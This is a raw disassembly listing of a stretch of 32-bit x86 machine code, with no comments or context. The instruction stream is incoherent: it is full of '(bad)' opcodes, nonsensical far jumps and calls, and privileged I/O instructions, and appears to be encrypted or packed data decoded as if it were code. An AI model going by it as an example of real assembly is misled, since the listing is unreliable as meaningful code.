  4174a4:	mov    ah,0xf7
  4174a6:	jle    0x417470
  4174a8:	jmp    0x3bd008ab
  4174ad:	adc    BYTE PTR [edx+0x5a],bl
  4174b0:	inc    edx
  4174b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174b2:	xchg   edi,eax
  4174b3:	inc    edi
  4174b4:	pop    ecx
  4174b5:	dec    edx
  4174b6:	cmp    eax,0x53acdfd4
  4174bb:	js     0x417459
  4174bd:	and    BYTE PTR [eax],bh
  4174bf:	xchg   DWORD PTR [esi-0x25],ebp
  4174c2:	mov    dh,0xaf
  4174c4:	fst    st(4)
  4174c6:	(bad)  
  4174c7:	shl    BYTE PTR [ebx-0x5fe75e34],1
  4174cd:	inc    eax
  4174ce:	(bad)  
  4174cf:	(bad)  
  4174d0:	xchg   ecx,eax
  4174d1:	xchg   esp,eax
  4174d2:	aaa    
  4174d3:	mov    db3,ebx
  4174d6:	xchg   edi,eax
  4174d7:	aaa    
  4174d8:	jbe    0x417550
  4174da:	sbb    ebx,ebp
  4174dc:	stos   DWORD PTR es:[edi],eax
  4174dd:	mov    esp,0xf0b6be11
  4174e2:	jmp    0xddd9:0x72718c86
  4174e9:	dec    ecx
  4174ea:	xchg   edx,eax
  4174eb:	mov    esp,DWORD PTR [ebp+0x6d]
  4174ee:	out    0xc5,eax
  4174f0:	aas    
  4174f1:	inc    eax
  4174f2:	mov    dh,0x7f
  4174f4:	push   0x1e
  4174f6:	clc    
  4174f7:	add    ch,al
  4174f9:	outs   dx,BYTE PTR ds:[esi]
  4174fa:	xchg   edi,eax
  4174fb:	es popa 
  4174fd:	repnz loope 0x417529
  417500:	adc    edi,DWORD PTR ds:0xb32faea3
  417506:	dec    eax
  417507:	xchg   DWORD PTR [esi],esi
  417509:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41750a:	sbb    al,0x70
  41750c:	frstor [edi+ecx*1+0x44]
  417510:	adc    BYTE PTR [eax+0x7c5e0068],0x15
  417517:	adc    bl,BYTE PTR [ebp-0x50]
  41751a:	fisub  WORD PTR [eax+0x45dc714b]
  417520:	hlt    
  417521:	or     esi,DWORD PTR [esi+edi*1]
  417524:	out    dx,eax
  417525:	add    DWORD PTR [eax-0x47ba511f],ebx
  41752b:	imul   ebp,edx,0x6ddd8b3f
  417531:	ins    BYTE PTR es:[edi],dx
  417532:	shl    DWORD PTR [edx+0x4e],cl
  417535:	loop   0x4174d7
  417537:	fwait
  417538:	loopne 0x41753c
  41753a:	mov    ds:0x55c5cb17,al
  41753f:	xchg   DWORD PTR [eax+0x40],ebp
  417542:	cmp    ch,cl
  417544:	mov    dh,0xb0
  417546:	rcr    BYTE PTR [esi-0x4b6767fc],0xb9
  41754d:	jne    0x41752f
  41754f:	inc    ecx
  417550:	push   0x4a
  417552:	(bad)  
  417553:	(bad)  [ebx+0x4f]
  417556:	mov    ebx,0x382ad5cc
  41755b:	sbb    esp,esi
  41755d:	sti    
  41755e:	(bad)  
  41755f:	sbb    eax,0x229472e4
  417564:	rcl    BYTE PTR [ebx],cl
  417566:	pop    eax
  417567:	adc    dh,BYTE PTR [edi-0x8932461]
  41756d:	les    edx,FWORD PTR [edx-0x21a6d79]
  417573:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417574:	in     al,dx
  417575:	dec    esi
  417576:	and    DWORD PTR [ebx-0x24],ecx
  417579:	outs   dx,BYTE PTR ds:[esi]
  41757a:	retf   
  41757b:	adc    eax,0x9632c029
  417580:	popa   
  417581:	(bad)  
  417582:	add    al,0xcc
  417584:	aas    
  417585:	xchg   esp,eax
  417586:	push   ebp
  417587:	xchg   DWORD PTR [esi-0x1b937ff3],eax
  41758d:	lds    esi,FWORD PTR [ebp-0x75]
  417590:	cld    
  417591:	pop    esp
  417592:	mov    bh,0x16
  417594:	mov    ecx,0xb6b32fad
  417599:	xor    ah,BYTE PTR [ebx+eiz*4-0x38]
  41759d:	enter  0xc6ad,0x29
  4175a1:	fxch   st(7)
  4175a3:	xlat   BYTE PTR ds:[ebx]
  4175a4:	push   ds
  4175a5:	inc    eax
  4175a6:	cmp    ah,bh
  4175a8:	or     BYTE PTR [edx-0xa],cl
  4175ab:	je     0x417538
  4175ad:	inc    ecx
  4175ae:	adc    esi,esp
  4175b0:	cmp    eax,ebx
  4175b2:	fstp   TBYTE PTR [ecx+0x71210bef]
  4175b8:	fst    QWORD PTR [eax-0x1782d79c]
  4175be:	stc    
  4175bf:	jmp    0xbd5cb5dd
  4175c4:	sahf   
  4175c5:	enter  0x6cee,0x94
  4175c9:	cmp    DWORD PTR [eax+0x28cd4671],ebx
  4175cf:	fwait
  4175d0:	dec    edi
  4175d1:	sahf   
  4175d2:	mov    esi,0xd09c6990
  4175d7:	xchg   BYTE PTR [ebx+0x3f10542],dh
  4175dd:	lahf   
  4175de:	xor    cl,BYTE PTR [esp+ebp*8]
  4175e1:	int    0xc8
  4175e3:	cmp    eax,0x470ebe5a
  4175e8:	hlt    
  4175e9:	aas    
  4175ea:	mov    bh,0x8c
  4175ec:	pop    esp
  4175ed:	push   ss
  4175ee:	pop    ebx
  4175ef:	xor    ebx,DWORD PTR [edx+eiz*2+0x641c030f]
  4175f6:	in     eax,dx
  4175f7:	and    al,0xe7
  4175f9:	clc    
  4175fa:	cmp    DWORD PTR [edi],eax
  4175fc:	push   ebx
  4175fd:	mov    WORD PTR gs:[ecx],fs
  417600:	dec    esi
  417601:	or     ah,BYTE PTR [eax-0x79]
  417604:	cmp    edx,DWORD PTR [ebx+0x37]
  417607:	fcmovu st,st(5)
  417609:	xchg   esi,eax
  41760a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41760b:	adc    DWORD PTR [esi-0x18b97de1],0x4e
  417612:	aad    0x3d
  417614:	mov    DWORD PTR [eax-0x1f095a49],ecx
  41761a:	push   ds
  41761b:	lahf   
  41761c:	fld    QWORD PTR [eax]
  41761e:	fisttp QWORD PTR [esi]
  417620:	jbe    0x4175ae
  417622:	nop
  417623:	(bad)  
  417624:	mov    al,ds:0x496f7340
  417629:	mov    esp,0xb835e57a
  41762e:	mov    bl,0x48
  417630:	sub    al,0x81
  417632:	push   edi
  417633:	mov    cl,0xb7
  417635:	aaa    
  417636:	lahf   
  417637:	mov    ch,BYTE PTR [ecx]
  417639:	cmp    BYTE PTR [eax-0x482b321a],al
  41763f:	xchg   ecx,eax
  417641:	mov    cs,WORD PTR [edx+0x4c]
  417644:	dec    ebp
  417645:	leave  
  417646:	xchg   edi,eax
  417647:	push   esi
  417648:	pop    es
  417649:	xchg   edx,eax
  41764a:	int3   
  41764b:	es retf 
  41764d:	dec    eax
  41764e:	cmp    al,BYTE PTR ds:0x8756b547
  417654:	femms  
  417656:	arpl   bx,di
  417658:	(bad)  [edi-0x38]
  41765b:	lea    eax,[ebx]
  41765d:	pop    edi
  41765e:	cmp    DWORD PTR [edi-0x34],0x811ed340
  417665:	loope  0x41768d
  417667:	loopne 0x417647
  417669:	ds stos DWORD PTR es:[edi],eax
  41766b:	jns    0x4176ad
  41766d:	lahf   
  41766e:	xchg   edi,eax
  41766f:	lock mov ds:0x87869fbc,al
  417675:	dec    edi
  417676:	sub    BYTE PTR [esi-0x2ae40ed0],dl
  41767c:	jns    0x417681
  41767e:	push   esi
  41767f:	mov    edi,0xc8425ba5
  417684:	lea    esi,[edi-0x34159269]
  41768a:	aad    0xea
  41768c:	jae    0x41767a
  41768e:	popf   
  41768f:	adc    esp,DWORD PTR [esi+0x36]
  417692:	retf   0xbd95
  417695:	into   
  417696:	or     eax,DWORD PTR [edx+0x62a13ca0]
  41769c:	cld    
  41769d:	arpl   dx,ax
  41769f:	cwde   
  4176a0:	jg     0x41764e
  4176a2:	and    eax,DWORD PTR [edi-0x9fba30f]
  4176a8:	sub    eax,0xdd6a340f
  4176ad:	in     eax,dx
  4176ae:	iret   
  4176af:	inc    ebp
  4176b0:	sti    
  4176b1:	out    dx,eax
  4176b2:	sahf   
  4176b3:	loope  0x4176a4
  4176b5:	jl     0x417674
  4176b7:	stos   BYTE PTR es:[edi],al
  4176b8:	add    BYTE PTR [ecx+0x16],bl
  4176bb:	test   eax,0x4731e873
  4176c0:	adc    al,0xd5
  4176c2:	xchg   DWORD PTR ds:[ecx-0x22c72fd9],esi
  4176c9:	cmp    al,0xc3
  4176cb:	or     al,0xdf
  4176cd:	xchg   ecx,eax
  4176ce:	mov    ds:0xb34f2980,eax
  4176d3:	xchg   esi,eax
  4176d4:	adc    DWORD PTR [edi+0x6e27757],eax
  4176da:	retf   0x57ee
  4176dd:	repnz xchg edi,eax
  4176df:	(bad)  
  4176e0:	shl    BYTE PTR [ecx+0x576c0137],1
  4176e6:	neg    BYTE PTR [eax]
  4176e8:	jne    0x417755
  4176ea:	push   edx
  4176eb:	xchg   eax,ebp
  4176ed:	inc    ebp
  4176ee:	push   eax
  4176ef:	lods   eax,DWORD PTR ds:[esi]
  4176f0:	fnsave [ebx-0x4826ee7d]
  4176f6:	outs   dx,BYTE PTR ds:[esi]
  4176f7:	add    bh,BYTE PTR [esi]
  4176f9:	inc    eax
  4176fa:	stc    
  4176fb:	int    0x95
  4176fd:	(bad)  
  4176fe:	jg     0x417754
  417700:	mov    eax,ds:0x85ba978f
  417705:	jp     0x4176d9
  417707:	clc    
  417708:	inc    DWORD PTR [ebx+0x32]
  41770b:	fyl2xp1 
  41770d:	sbb    BYTE PTR [eax],0xa3
  417710:	call   0xa9fd:0xe2073431
  417717:	push   cs
  417718:	add    al,0xb2
  41771a:	xchg   edi,eax
  41771b:	cmp    DWORD PTR [edx+0x6c00a2e8],ecx
  417721:	inc    eax
  417722:	shr    DWORD PTR [edx-0xd],cl
  417725:	lock cwde 
  417727:	push   ebp
  417728:	and    BYTE PTR ds:0xad726d98,bh
  41772e:	mov    edi,0x419ead23
  417733:	and    esp,DWORD PTR [ebx+0x33af2f01]
  417739:	test   al,0x25
  41773b:	xchg   DWORD PTR [eax-0xb],ebp
  41773e:	call   0x16f5:0xa432e86a
  417745:	ror    ah,0xd4
  417748:	xor    ah,0x67
  41774b:	push   eax
  41774c:	jecxz  0x417725
  41774e:	stos   BYTE PTR es:[edi],al
  41774f:	mov    ds:0x87146fed,al
  417754:	rcr    BYTE PTR [eax-0x69],0xc9
  417758:	fwait
  417759:	ret    0xd3f7
  41775c:	add    eax,0x9c91d406
  417761:	es iret 
  417763:	xchg   BYTE PTR [ecx+0x3e],cl
  417766:	pop    edi
  417767:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417768:	push   ss
  417769:	sub    DWORD PTR [eax+0x10],ebp
  41776c:	dec    ebx
  41776d:	and    eax,0x4adf86b7
  417772:	jbe    0x41771b
  417774:	push   es
  417775:	lods   eax,DWORD PTR ds:[esi]
  417776:	jne    0x4176ff
  417778:	hlt    
  417779:	in     al,dx
  41777a:	xor    BYTE PTR [edx+0x43d518dd],dh
  417780:	sub    edx,DWORD PTR [eax+0x3a]
  417783:	test   BYTE PTR [esi-0x22b62988],al
  417789:	push   ds
  41778a:	test   ecx,ebx
  41778c:	push   esi
  41778d:	dec    BYTE PTR [edx]
  41778f:	in     al,dx
  417790:	(bad)  
  417792:	adc    eax,DWORD PTR [esi]
  417794:	mov    esi,0x8bc88232
  417799:	inc    eax
  41779a:	nop
  41779b:	pop    eax
  41779c:	pop    ebp
  41779d:	call   0xf9e8316a
  4177a2:	xchg   ebp,eax
  4177a3:	xor    ch,bl
  4177a5:	outs   dx,DWORD PTR ds:[esi]
  4177a6:	pop    esi
  4177a7:	add    eax,0xa44176cd
  4177ac:	xor    BYTE PTR [eax+0x35],al
  4177af:	test   al,0xb8
  4177b1:	xchg   ebp,eax
  4177b2:	cmpxchg BYTE PTR ds:0x51ec9790,bh
  4177b9:	cdq    
  4177ba:	es shl dh,1
  4177bd:	xor    BYTE PTR [ecx-0x177566f1],bh
  4177c3:	xchg   BYTE PTR [esi],bh
  4177c5:	repnz and eax,0x1933ddde
  4177cb:	jae    0x417828
  4177cd:	outs   dx,BYTE PTR ds:[esi]
  4177ce:	stos   DWORD PTR es:[edi],eax
  4177cf:	(bad)  
  4177d0:	mov    ecx,0x97703740
  4177d5:	or     eax,0x854ffd35
  4177da:	xchg   edi,eax
  4177db:	sub    eax,0xcde338af
  4177e0:	mov    ebx,0xfc324528
  4177e5:	ins    BYTE PTR es:[edi],dx
  4177e6:	inc    esp
  4177e7:	mov    bl,0x1c
  4177e9:	mov    ds:0x41e886f0,al
  4177ee:	xchg   edi,eax
  4177ef:	pop    esp
  4177f0:	sahf   
  4177f1:	adc    bl,BYTE PTR [eax]
  4177f3:	cdq    
  4177f4:	jecxz  0x417844
  4177f6:	enter  0xa483,0x2a
  4177fa:	iret   
  4177fb:	xchg   BYTE PTR [eax-0x2236a424],dh
  417801:	in     al,dx
  417802:	inc    esi
  417803:	push   cs
  417804:	inc    edi
  417805:	fwait
  417806:	icebp  
  417807:	shr    BYTE PTR [esi-0x2bb7dac0],cl
  41780d:	mov    edi,DWORD PTR [ebp-0x25]
  417810:	fisub  DWORD PTR [edx]
  417812:	cwde   
  417813:	and    al,0xb0
  417815:	xchg   DWORD PTR [edi-0x3c3f832b],esp
  41781b:	pop    esi
  41781c:	shr    DWORD PTR [ebx+edi*8],0x86
  417820:	jle    0x4177cc
  417822:	aad    0xbc
  417824:	fstp   QWORD PTR [ebp-0x72cf3321]
  41782a:	xor    DWORD PTR [ecx],edi
  41782c:	xor    DWORD PTR [esi+0x53],ebx
  41782f:	dec    ebx
  417830:	mov    bl,0x40
  417832:	ins    BYTE PTR es:[edi],dx
  417833:	pusha  
  417834:	repz rcr al,cl
  417837:	inc    eax
  417838:	(bad)  [edi+0x48]
  41783b:	sub    al,0x84
  41783d:	ds jecxz 0x4177d6
  417840:	and    al,BYTE PTR [eax+0x45]
  417843:	pop    es
  417844:	dec    DWORD PTR [edi]
  417846:	hlt    
  417847:	adc    al,0x81
  417849:	push   ebx
  41784a:	pushf  
  41784b:	popf   
  41784c:	arpl   WORD PTR [ecx-0x10],ax
  41784f:	jl     0x4178ae
  417851:	mov    ecx,ecx
  417853:	repz mov ebp,0x50d1b347
  417859:	les    ecx,FWORD PTR [edi+0x58ba6d07]
  41785f:	addr16 jmp 0x417820
  417862:	hlt    
  417863:	pusha  
  417864:	shl    BYTE PTR [ebp+0x1e5d5394],1
  41786a:	mov    edi,0xfd5e00da
  41786f:	int    0xad
  417871:	inc    eax
  417872:	ins    DWORD PTR es:[edi],dx
  417873:	jno    0x4178c4
  417875:	popa   
  417876:	fs xor ebx,ebp
  417879:	pop    ebp
  41787a:	mov    cl,0x5b
  41787c:	jns    0x4178f2
  41787e:	add    eax,DWORD PTR [ecx-0x79]
  417881:	inc    ecx
  417882:	fcomp  st(2)
  417884:	jmp    0x62339d6e
  417889:	sub    BYTE PTR [ebx+0x27],dl
  41788c:	jne    0x41784b
  41788e:	jns    0x4178cf
  417890:	fucom  st(2)
  417892:	stos   BYTE PTR es:[edi],al
  417893:	lahf   
  417894:	pop    edx
  417895:	retf   0xbc65
  417898:	leave  
  417899:	inc    ebx
  41789a:	fcom   QWORD PTR [esi+esi*4-0x6aaf7353]
  4178a1:	jp     0x417857
  4178a3:	mov    esp,0xe74474e1
  4178a8:	mul    BYTE PTR [ebx+0x5a]
  4178ab:	sub    esp,edx
  4178ad:	not    edi
  4178af:	sbb    al,0x9b
  4178b1:	sahf   
  4178b2:	xor    BYTE PTR [eax],dh
  4178b4:	fisttp DWORD PTR [esi]
  4178b6:	mov    ebx,0x2f0fc094
  4178bb:	ret    0xcfd5
  4178be:	jnp    0x41792f
  4178c0:	push   ss
  4178c1:	jae    0x417843
  4178c3:	xor    eax,0x9bfdaf9
  4178c8:	shl    DWORD PTR [edi],1
  4178ca:	retf   
  4178cb:	push   esp
  4178cc:	mov    dh,0xe8
  4178ce:	adc    ebp,DWORD PTR [edx]
  4178d0:	inc    BYTE PTR [eax+0x1e]
  4178d3:	std    
  4178d4:	(bad)  
  4178d5:	pushf  
  4178d6:	xchg   bh,ah
  4178d8:	xchg   ebx,eax
  4178d9:	cmp    bh,cl
  4178db:	leave  
  4178dc:	fld    QWORD PTR [ebx]
  4178de:	and    bl,dl
  4178e0:	add    BYTE PTR ds:0x408b33a2,dh
  4178e6:	scas   eax,DWORD PTR es:[edi]
  4178e7:	es push edi
  4178e9:	add    ecx,DWORD PTR [ebp-0x72]
  4178ec:	sbb    eax,0xd74197bb
  4178f1:	jnp    0x41787c
  4178f3:	fimul  WORD PTR [ebp-0x35d39572]
  4178f9:	bound  ecx,QWORD PTR [ebp-0x79]
  4178fc:	leave  
  4178fd:	pop    ds
  4178fe:	jnp    0x417958
  417900:	fstp   st(6)
  417902:	and    al,0x7d
  417904:	dec    eax
  417905:	shl    DWORD PTR [edx-0x33],0xb1
  417909:	inc    eax
  41790a:	js     0x4178f3
  41790c:	arpl   WORD PTR [ecx+0x19bf822d],bp
  417912:	mov    dh,0x8c
  417914:	or     DWORD PTR [eax-0x69],esi
  417917:	mov    ds,WORD PTR [edx-0x25]
  41791a:	pop    ds
  41791b:	push   ebp
  41791c:	dec    esi
  41791d:	inc    eax
  41791e:	lods   al,BYTE PTR ds:[esi]
  41791f:	iret   
  417920:	xchg   esi,eax
  417921:	jns    0x41792a
  417923:	int3   
  417924:	ins    DWORD PTR es:[edi],dx
  417925:	(bad)  
  417926:	xchg   edi,eax
  417927:	inc    ebp
  417928:	cmp    BYTE PTR [edi+0xaa8fbd9],cl
  41792e:	cmp    eax,0x79bdc824
  417933:	xchg   DWORD PTR [ecx-0x22c765fe],ecx
  417939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41793a:	dec    edi
  41793b:	xor    BYTE PTR [ebx+esi*8-0x40],0x5c
  417940:	rol    DWORD PTR [edi-0x34],cl
  417943:	xor    BYTE PTR [edi],al
  417945:	daa    
  417946:	mov    cl,0x71
  417948:	mov    ebp,0xc2172f63
  41794d:	xor    al,0x75
  41794f:	je     0x41792e
  417951:	xor    ebx,DWORD PTR [edx]
  417953:	(bad)  
  417954:	cld    
  417955:	xchg   esp,eax
  417956:	nop
  417957:	fist   WORD PTR ds:0xdf042b40
  41795d:	loopne 0x4179de
  41795f:	push   ecx
  417960:	push   cs
  417961:	pop    ss
  417962:	cwde   
  417963:	adc    bh,cl
  417965:	jg     0x4179c5
  417967:	pop    ds
  417968:	add    DWORD PTR [ebx+eiz*8+0x30],ebp
  41796c:	std    
  41796d:	add    eax,0x929486a0
  417972:	loop   0x417929
  417974:	cld    
  417975:	fdivr  QWORD PTR [edi+0x2611eb8d]
  41797b:	pusha  
  41797c:	dec    eax
  41797d:	sbb    BYTE PTR [ebp+0x5f3fed06],0x78
  417984:	fistp  QWORD PTR [edi-0x76ec2880]
  41798a:	(bad)  
  41798b:	(bad)  
  41798c:	enter  0x91c1,0x8c
  417990:	push   esp
  417991:	shr    DWORD PTR [esi],1
  417993:	xor    ebx,DWORD PTR [ebp-0x2b0cfed0]
  417999:	push   0x95bf8a63
  41799e:	pop    ss
  41799f:	adc    BYTE PTR [ebp+esi*8+0x2f69aa97],bl
  4179a6:	retf   
  4179a7:	fstp   DWORD PTR [esi]
  4179a9:	jo     0x417a02
  4179ab:	mov    al,ds:0x86b8a8ed
  4179b0:	(bad)  
  4179b1:	jp     0x41793f
  4179b3:	sub    ch,bl
  4179b5:	add    eax,0x164d4a34
  4179ba:	dec    ebp
  4179bb:	xor    dl,BYTE PTR [edi+0x40]
  4179be:	mov    ch,0xd8
  4179c0:	xchg   ecx,eax
  4179c1:	test   eax,0xc68cd3cd
  4179c6:	xchg   edi,eax
  4179c7:	mov    bh,0x47
  4179c9:	ret    0xb529
  4179cc:	add    al,0x78
  4179ce:	mov    al,0xcc
  4179d0:	jne    0x4179cb
  4179d2:	pop    esp
  4179d3:	mov    BYTE PTR [ebx-0x1c],dh
  4179d6:	setnp  ch
  4179d9:	gs xchg edi,eax
  4179db:	dec    esi
  4179dc:	xor    ebp,esp
  4179de:	push   0x5e
  4179e0:	add    eax,0xabfd8f55
  4179e5:	mov    ecx,cs
  4179e7:	xchg   BYTE PTR [ebx-0x224b8e29],bl
  4179ed:	imul   edi,DWORD PTR [ecx+0x7be7db31],0x6c409031
  4179f7:	ins    DWORD PTR es:[edi],dx
  4179f8:	in     eax,0x46
  4179fa:	inc    ebx
  4179fb:	je     0x4179b7
  4179fd:	mov    al,0x97
  4179ff:	mov    dl,BYTE PTR [edx]
  417a01:	cmp    ecx,edi
  417a03:	mov    edx,0xc1e0bd7f
  417a08:	cdq    
  417a09:	addr16 add al,0x87
  417a0c:	in     eax,dx
  417a0d:	dec    ecx
  417a0e:	pop    esi
  417a0f:	(bad)  
  417a10:	xlat   BYTE PTR ds:[ebx]
  417a11:	pop    esi
  417a12:	xchg   edi,eax
  417a13:	std    
  417a14:	int    0x11
  417a16:	mov    cl,0x73
  417a18:	(bad)  
  417a19:	mov    ch,0x41
  417a1b:	ret    
  417a1c:	or     al,0xdc
  417a1e:	xchg   edi,eax
  417a1f:	into   
  417a20:	mov    WORD PTR [edi+0xc9fe74d],?
  417a26:	aam    0x4c
  417a28:	cmp    eax,eax
  417a2a:	xchg   ecx,eax
  417a2b:	pusha  
  417a2c:	fbstp  TBYTE PTR [edx+0x51]
  417a2f:	inc    cl
  417a31:	inc    eax
  417a32:	int3   
  417a33:	jns    0x417aa0
  417a35:	jmp    0x417a8a
  417a37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a38:	or     eax,0x870197b0
  417a3d:	gs stc 
  417a3f:	mov    edi,0x7cedd00e
  417a44:	inc    edx
  417a45:	mov    ch,0x61
  417a47:	xchg   DWORD PTR [esi-0x223af939],esi
  417a4d:	(bad)  
  417a4e:	push   eax
  417a4f:	aaa    
  417a50:	retf   0x4c5c
  417a53:	mov    al,ds:0x3e5a4fd5
  417a58:	loope  0x417a12
  417a5a:	mov    eax,0x397be58b
  417a5f:	shl    DWORD PTR [eax],cl
  417a61:	cmp    al,0x98
  417a63:	push   esp
  417a64:	or     bl,BYTE PTR [ecx+0x62]
  417a67:	mov    ds:0x75d3dcf,eax
  417a6c:	add    dh,BYTE PTR [ecx+0x17]
  417a6f:	ret    
  417a70:	pop    es
  417a71:	pusha  
  417a72:	lahf   
  417a73:	and    al,0xe1
  417a75:	scas   al,BYTE PTR es:[edi]
  417a76:	dec    edi
  417a77:	aam    0x18
  417a79:	(bad)  
  417a7a:	scas   al,BYTE PTR es:[edi]
  417a7b:	xchg   ebx,eax
  417a7c:	data16 arpl WORD PTR [bp+si-0x3f2f],cx
  417a82:	loop   0x417aae
  417a84:	push   esp
  417a85:	dec    esi
  417a86:	or     BYTE PTR [esi],bl
  417a88:	cdq    
  417a89:	lods   eax,DWORD PTR ds:[esi]
  417a8a:	aaa    
  417a8b:	lahf   
  417a8c:	pop    ebp
  417a8d:	jg     0x417a21
  417a8f:	pop    ebx
  417a90:	push   edx
  417a91:	jecxz  0x417a2f
  417a93:	pop    esi
  417a94:	test   BYTE PTR [esi+0x4ddb465],bh
  417a9a:	inc    edx
  417a9b:	sti    
  417a9c:	icebp  
  417a9d:	xchg   esp,eax
  417a9e:	test   DWORD PTR [edi],edx
  417aa0:	ins    BYTE PTR es:[edi],dx
  417aa1:	dec    eax
  417aa2:	cdq    
  417aa3:	sar    DWORD PTR [edi+0x6b],0x6c
  417aa7:	leave  
  417aa8:	sahf   
  417aa9:	test   eax,0xa1edb3d4
  417aae:	fld    QWORD PTR [esi]
  417ab0:	popa   
  417ab1:	test   BYTE PTR [edx+0x20],dl
  417ab4:	stc    
  417ab5:	mov    esi,0x84efa50f
  417aba:	enter  0xa7c7,0x8
  417abe:	in     eax,0x66
  417ac0:	fisttp QWORD PTR [esi]
  417ac2:	xchg   esi,edx
  417ac4:	cmp    al,0xdc
  417ac6:	sbb    eax,0x8d5c39e2
  417acb:	outs   dx,DWORD PTR ds:[esi]
  417acc:	inc    DWORD PTR [eax+0x3e11354]
  417ad2:	stos   BYTE PTR es:[edi],al
  417ad3:	pushf  
  417ad4:	leave  
  417ad5:	in     eax,0x97
  417ad7:	div    BYTE PTR [edi+0x51]
  417ada:	sbb    ebp,DWORD PTR [eax-0xa00200a]
  417ae0:	jae    0x417b22
  417ae2:	dec    ecx
  417ae3:	sub    DWORD PTR [edi],0x2ef02f6e
  417ae9:	inc    edx
  417aea:	or     dl,dl
  417aec:	push   ecx
  417aed:	xor    al,0xc0
  417aef:	adc    al,0xed
  417af1:	pop    ss
  417af2:	cdq    
  417af3:	call   0x66e3e640
  417af8:	jg     0x417abd
  417afa:	arpl   WORD PTR [ecx],bx
  417afc:	mov    al,BYTE PTR [eax-0x7e]
  417aff:	sub    bh,BYTE PTR [ebx+edx*2]
  417b02:	(bad)  
  417b03:	push   ecx
  417b04:	push   ds
  417b05:	aaa    
  417b06:	cwde   
  417b07:	cs pop ebp
  417b09:	ss call 0xa9827f5d
  417b0f:	mov    dl,0x81
  417b11:	inc    eax
  417b12:	retf   
  417b13:	jle    0x417b85
  417b15:	enter  0xfd23,0xe2
  417b19:	push   eax
  417b1a:	xchg   edi,eax
  417b1b:	stos   DWORD PTR es:[edi],eax
  417b1c:	test   BYTE PTR [esi+0x5a],dh
  417b1f:	aam    0x7b
  417b21:	cmp    bl,BYTE PTR [esi-0x5676bafc]
  417b27:	xchg   BYTE PTR ds:0xddd3497e,dl
  417b2d:	lea    ebp,[eax]
  417b2f:	cmp    ebx,DWORD PTR [ecx+eax*4+0x5d126e88]
  417b36:	jmp    0xa901731d
  417b3b:	jp     0x417b18
  417b3d:	mov    DWORD PTR [edi-0xe7f62d9],ecx
  417b43:	ins    BYTE PTR es:[edi],dx
  417b44:	daa    
  417b45:	leave  
  417b46:	imul   esi,DWORD PTR [esi],0xffffffac
  417b49:	add    BYTE PTR [edi],dl
  417b4b:	xchg   DWORD PTR [eax-0x22fa7aee],ecx
  417b51:	and    al,BYTE PTR [edx]
  417b53:	and    BYTE PTR [ebp+0x6a135a2],dh
  417b59:	mov    ecx,0x12ffda33
  417b5e:	jmp    0x4565:0xa8dffd95
  417b65:	mov    esp,0xb427cbd4
  417b6a:	call   0xbcd9:0xf09110a9
  417b71:	add    DWORD PTR [ebp-0x76],esi
  417b74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417b75:	mov    DWORD PTR ds:0xf2cabb30,edx
  417b7b:	(bad)  
  417b7c:	in     al,dx
  417b7d:	aas    
  417b7e:	push   edi
  417b7f:	pop    edx
  417b80:	jns    0x417b93
  417b82:	cwde   
  417b83:	es cli 
  417b85:	jge    0x417bca
  417b87:	cmp    eax,0x3e9e27f2
  417b8c:	fcmovbe st,st(5)
  417b8e:	aas    
  417b8f:	xchg   esi,eax
  417b90:	cmp    eax,0xe82cc1e2
  417b95:	adc    BYTE PTR [eax-0x3886fc5c],bl
  417b9b:	inc    esp
  417b9c:	outs   dx,BYTE PTR ds:[esi]
  417b9d:	gs push esi
  417b9f:	test   al,0x49
  417ba1:	das    
  417ba2:	cmp    BYTE PTR [eax+0x71174edd],dl
  417ba8:	mov    cl,0x6e
  417baa:	xchg   edi,eax
  417bab:	pusha  
  417bac:	fwait
  417bad:	sub    al,0x3b
  417baf:	xchg   esi,eax
  417bb0:	mov    bl,0xce
  417bb2:	xchg   edx,eax
  417bb3:	retf   
  417bb4:	jecxz  0x417b5a
  417bb6:	adc    al,0xa3
  417bb8:	jne    0x417b50
  417bba:	cmp    al,0xc7
  417bbc:	mov    ds:0x64b89f33,eax
  417bc1:	pop    ebp
  417bc2:	or     edx,edx
  417bc4:	dec    ebp
  417bc5:	aad    0x66
  417bc7:	popf   
  417bc8:	pusha  
  417bc9:	inc    eax
  417bca:	xor    al,0x25
  417bcc:	hlt    
  417bcd:	icebp  
  417bce:	test   BYTE PTR [ebx+0xa99b934],bh
  417bd4:	ror    cl,1
  417bd6:	or     eax,eax
  417bd8:	cdq    
  417bd9:	add    BYTE PTR [esi-0x4ebc4afd],al
  417bdf:	cld    
  417be0:	mov    ebp,0x7d1bff43
  417be5:	sub    cl,BYTE PTR [ebx]
  417be7:	sbb    ch,0x45
  417bea:	add    dl,BYTE PTR ss:[eax]
  417bed:	js     0x417c5d
  417bef:	int    0x4
  417bf1:	inc    eax
  417bf2:	jbe    0x417bf0
  417bf4:	iret   
  417bf5:	cmp    bh,BYTE PTR [edi+0x73]
  417bf8:	out    dx,eax
  417bf9:	jbe    0x417b92
  417bfb:	outs   dx,DWORD PTR ds:[esi]
  417bfc:	scas   al,BYTE PTR es:[edi]
  417bfd:	ds xchg ebx,eax
  417bff:	jmp    0x2d240005
  417c04:	stos   DWORD PTR es:[edi],eax
  417c05:	rol    DWORD PTR [ebx],0x87
  417c08:	mov    ah,0x76
  417c0a:	test   DWORD PTR [eax-0x73f84d23],esp
  417c10:	sub    eax,0x1886888d
  417c15:	inc    ebx
  417c16:	imul   DWORD PTR [edi]
  417c18:	ret    0x4c30
  417c1b:	xor    DWORD PTR [eax+0x50f5787c],esp
  417c21:	cmp    al,0xfb
  417c23:	outs   dx,DWORD PTR ds:[esi]
  417c24:	ffree  st(5)
  417c26:	or     eax,0xbaffc8e4
  417c2b:	mov    DWORD PTR [eax],ebp
  417c2d:	inc    eax
  417c2e:	add    DWORD PTR [ebx],ebx
  417c30:	or     esp,DWORD PTR [edx]
  417c32:	push   edx
  417c33:	pop    eax
  417c34:	pop    edi
  417c35:	add    ebx,DWORD PTR [eax-0x266d2d1c]
  417c3b:	xor    cl,BYTE PTR [eax]
  417c3d:	or     al,0xf
  417c3f:	psrlq  mm6,QWORD PTR ds:0x3811fb94
  417c46:	jmp    0x3859065d
